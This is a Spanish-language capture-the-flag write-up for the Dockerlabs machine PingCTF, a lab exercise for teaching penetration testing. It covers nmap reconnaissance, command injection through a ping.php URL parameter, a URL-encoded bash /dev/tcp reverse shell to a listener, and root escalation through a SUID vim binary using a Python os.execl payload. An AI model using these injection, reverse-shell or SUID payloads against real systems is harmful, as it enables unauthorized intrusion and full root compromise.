---
title: PingCTF - Easy (Dockerlabs)
permalink: /PingCTF-Dockerlabs-Writeup/
tags:
  - "Linux"
  - "Easy"
  - "Command Injection"
  - "SUID Binaries"
  - "Vim"
categories:
  - writeup
  - hacking
  - dockerlabs
toc: true
toc_label: Topics
toc_sticky: true
sidebar:
  - main
seo_tittle: PingCTF - Easy (Dockerlabs)
seo_description: Abusa un servicio web inseguro y de binarios SUID para vencer PingCTF.
excerpt: Abusa un servicio web inseguro y de binarios SUID para vencer PingCTF.
header:
  overlay_image: /assets/images/headers/pingctf-dockerlabs.jpg
  overlay_filter: 0.7
  og_image: /assets/images/headers/pingctf-dockerlabs.jpg
---


![image-center](/assets/images/posts/pingctf-dockerlabs.png)
{: .align-center}

**Habilidades:** Command Injection, Abusing SUID Binaries (`vim`)
{: .notice--primary}

# Introducción

PingCTF es una máquina de Dockerlabs de dificultad `Fácil` donde debemos comprometer un servicio web para ganar acceso inicial. Una vez dentro, abusaremos de permisos mal configurados para el binario `vim`.
<br>
# Reconocimiento
---
Enviaremos una traza ICMP para comprobar que la máquina víctima se encuentre activa

~~~ bash
ping -c 1 172.17.0.2     
PING 172.17.0.2 (172.17.0.2) 56(84) bytes of data.
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.232 ms

--- 172.17.0.2 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.232/0.232/0.232/0.000 ms
~~~


## Nmap Scanning 

Haremos un escaneo con el propósito de identificar puertos abiertos en la máquina víctima

~~~ bash
nmap -p- --open -sS --min-rate 5000 -n -Pn 172.17.0.2 -oG openPorts
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-31 18:15 EDT
Nmap scan report for 172.17.0.2
Host is up (0.000011s latency).
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE
80/tcp open  http
MAC Address: 02:42:AC:11:00:02 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 1.42 seconds
~~~

- `--open`: Mostrar únicamente los puertos abiertos
- `-p-`: Hacer un escaneo del total de puertos **(65535)**
- `--min-rate 5000`: Enviar mínimo **5000 paquetes por segundo**
- `-n`: No aplicar **resolución DNS**, lo que acelera el escaneo
- `-sS`: Modo de **escaneo TCP SYN**, no concluye la conexión, lo que hace el escaneo más ágil
- `-Pn`: Omitir el **descubrimiento de host (ARP)**
- `-oG`: Exportar en formato `grepable`
- `-v`: Ver el progreso del escaneo

Vemos que solamente el servicio `HTTP` se encuentra activo. Realizaremos un segundo escaneo frente a este servicio con el fin de detectar la versión y aplicar una serie de scripts básicos de reconocimiento

~~~ bash
nmap -p 80 -sVC 172.17.0.2 -oN services                            
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-31 18:15 EDT
Nmap scan report for 172.17.0.2
Host is up (0.000054s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-server-header: Apache/2.4.58 (Ubuntu)
|_http-title: Ping
MAC Address: 02:42:AC:11:00:02 (Unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.93 seconds
~~~

- `-p`: Especificar puertos
- `-sV`: Identificar la versión del servicio 
- `-sC`: Uso de scripts de reconocimiento
- `-oN`: Exportar la salida en formato normal


## Web Analysis

También podemos aplicar un escaneo de las tecnologías web que el servidor web pueda estar empleando para gestionar el contenido

~~~ bash
whatweb http://172.17.0.2                                  
http://172.17.0.2 [200 OK] Apache[2.4.58], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.58 (Ubuntu)], IP[172.17.0.2], Title[Ping]
~~~

Si navegamos hasta la web, veremos un servicio que al parecer nos permite verificar conectividad con una dirección IP

![image-center](/assets/images/posts/pingctf-web-analysis.png)
{: .align-center}

Si hacemos clic en `Enviar`, el servidor nos muestra lo siguiente, donde envía la dirección IP en un parámetro de la `url`

![image-center](/assets/images/posts/pingctf-web-analysis-2.png)
{: .align-center}
<br>
# Intrusión / Explotación
---
## Command Injection

Sabiendo que esta funcionalidad posiblemente ejecute el comando `ping`, podemos intentar inyectar un comando para ver si se ejecuta

~~~ bash
http://172.17.0.2/ping.php?target=127.0.0.1; id
~~~

![image-center](/assets/images/posts/pingctf-command-injection.png)
{: .align-center}

Vemos la salida del comando `id`. En este punto podemos intentar enviarnos una reverse shell a través de la URL, aunque posiblemente necesitemos codificar algunos caracteres especiales como `&`.

Abriremos un listener antes de enviar la conexión a nuestra máquina, escucharemos por un puerto, en mi caso he elegido el `443` (puedes elegir otro si quieres)

~~~ bash
nc -lvnp 443
~~~

Nuestra reverse shell luce más o menos de la siguiente manera

~~~ bash
http://172.17.0.2/ping.php?target=127.0.0.1;bash -c %27/bin/bash -i >%26 %2Fdev%2Ftcp%2F172.17.0.1%2F443 0>%261%27
~~~

- `%26 --> &`
- `%27 --> '`
- `%2F --> /`


## Shell as `www-data`

Al enviar la solicitud maliciosa al servidor, recibiremos la conexión como el usuario `www-data`

~~~ bash
nc -lvnp 443 
listening on [any] 443 ...
connect to [172.17.0.1] from (UNKNOWN) [172.17.0.2] 37076
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
www-data@5ba58a964e24:/var/www/html$ 
~~~
<br>


# Escalada de Privilegios
---
## Abusing SUID Binaries (`vim`)

Si listamos binarios que tengan el bit `SUID` habilitado, veremos un binario inusual

~~~ bash
www-data@5ba58a964e24:/var/www/html$ find / -perm -4000 2>/dev/null
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/mount
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/su
/usr/bin/umount
/usr/bin/vim.basic
~~~

 Si ejecutamos `vim.basic`, según la salida veremos que parece ser una copia de `vim`

~~~ bash
www-data@5ba58a964e24:/var/www/html$ /usr/bin/vim.basic --help 
VIM - Vi IMproved 9.1 (2024 Jan 02, compiled Apr 01 2025 20:12:31)

Usage: vim [arguments] [file ..]       edit specified file(s)
   or: vim [arguments] -               read text from stdin
   or: vim [arguments] -t tag          edit file where tag is defined
   or: vim [arguments] -q [errorfile]  edit file with first error
...
...
~~~


## Root Time

Una simple búsqueda en `GTFOBins` nos muestra cómo abusar de este permiso, donde ejecutamos una sesión de `bash` con el parámetro `-p` a través de `python3`

~~~ bash
www-data@5ba58a964e24:/var/www/html$ /usr/bin/vim.basic -c ':py3 import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")'

E79: Cannot expand wildcards
Press ENTER or type command to continue # Presionamos ENTER

# id
uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)
~~~
<br>
Gracias por leer este artículo, espero te haya sido de ayuda. Te dejo la cita del día:

> Bite off more than you can chew, then chew it.
> — Ella Williams
{: .notice--info}
